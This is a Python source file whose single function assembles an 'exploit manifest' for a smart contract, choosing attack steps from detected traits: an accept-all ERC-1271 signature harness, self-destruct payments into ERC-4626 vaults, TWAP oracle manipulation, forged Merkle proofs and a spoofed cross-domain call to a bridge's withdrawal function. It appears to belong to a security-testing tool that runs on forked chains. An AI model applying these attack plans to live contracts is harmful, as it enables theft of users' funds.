# spdx-license-identifier: mit
"""module docstring"""

from __future__ import annotations

from typing import Any, Dict, List


def synthesize_manifest(target: Dict[str, Any]) -> Dict[str, Any]:
    """
    Build a deterministic exploit manifest based on discovered traits.
    """
    address = target["address"]
    modules: List[str] = []
    steps: List[Dict[str, Any]] = []

    proxy_info = target.get("proxy") or {}
    if proxy_info:
        modules.append("EIP1967Reader")
        steps.append({"module": "EIP1967Impl", "proxy": address, "out": "IMPL"})

    traits = target.get("traits") or {}

    if traits.get("erc1271"):
        modules.extend(["EIP1271Harness", "CalldataForge"])
        steps.append({"module": "EIP1271AcceptAll", "out": "WALLET"})

    if traits.get("erc4626"):
        modules.extend(["ERC4626Helper", "SelfDestructPay"])
        steps.append({"module": "SelfDestructPay", "to": "VAULT", "value": "1 ether"})

    # twap / oracle manipulation helpers
    if traits.get("v3_pool") or traits.get("twap_oracle"):
        modules.append("V3OracleMock")
        steps.append({"module": "V3OracleMock", "out": "ORACLE"})
        steps.append({
            "module": "V3Twap",
            "pool": "ORACLE",
            "secondsAgo": 600,
            "baseToken": traits.get("token") or "TOKEN",
            "quoteToken": traits.get("weth") or "WETH",
            "baseAmount": "1 ether",
            "out": "QUOTE"
        })

    if traits.get("bridge_finalize"):
        modules.extend(["CrossDomainHarness", "MerkleForge", "BridgeFinalizer"])
        steps.append(
            {
                "module": "MerkleForge",
                "leaves": [
                    "keccak256(abi.encode(1))",
                    "keccak256(abi.encode(2))",
                ],
                "index": 0,
                "sorted": True,
                "out_leaf": "LEAF",
                "out_proof": "PROOF",
                "out_root": "ROOT",
            }
        )
        steps.append(
            {
                "module": "XDomainSpoofCall",
                "messenger": "MESSENGER",
                "xSender": "XSENDER",
                "target": address,
                "sig": "finalizeWithdrawal(bytes32,bytes32[])",
                "args": ["LEAF", "PROOF"],
            }
        )

    manifest = {
        "name": f"AUTO_{address}",
        "fork_block": 0,
        "modules": list(dict.fromkeys(modules)),
        "constants": {"TARGET": address},
        "strategy": {"steps": steps or [{"module": "EventsRecord"}]},
    }
    return manifest
